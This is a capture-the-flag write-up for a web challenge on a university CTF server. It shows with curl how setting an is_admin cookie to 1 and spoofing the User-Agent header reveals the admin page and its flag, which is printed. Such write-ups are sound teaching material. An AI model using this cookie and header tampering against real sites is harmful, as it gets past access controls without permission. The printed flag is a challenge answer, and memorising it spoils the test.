# Inspector Gadget
Category: Web

## Description
> [YouTube Video](https://www.youtube.com/watch?v=EcF2LOaLgA0&feature=youtu.be)

## Solution

We enter the website and get a simple page with three links: "Home", "About", and "Admin". If we click "Admin", we get redirected back to the index with an error message: "*You're not admin*".

Let's check the website cookies:

```console
root@kali:/media/sf_CTFs/technion/236927_-_Introduction_to_Robotics# curl http://ctf.cs.technion.ac.il:4009/ -I
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 6444
Set-Cookie: is_admin=0; Path=/
Server: Werkzeug/1.0.1 Python/3.6.1
Date: Fri, 18 Dec 2020 19:53:39 GMT
```

What if we change `is_admin` to `1`? In this case, when we revisit the webpage we get a different message: "*You can see this page only by browsing with InspectorBrowser*".

So, let's change the user agent too:

```console
root@kali:/media/sf_CTFs/technion/236927_-_Introduction_to_Robotics# curl 'http://ctf.cs.technion.ac.il:4009/admin' -H 'User-Agent: InspectorBrowser' -H 'Cookie: is_admin=1' -s | grep cstechnion
      <h1> cstechnion{G0_go_6adg3t!} </h1>
```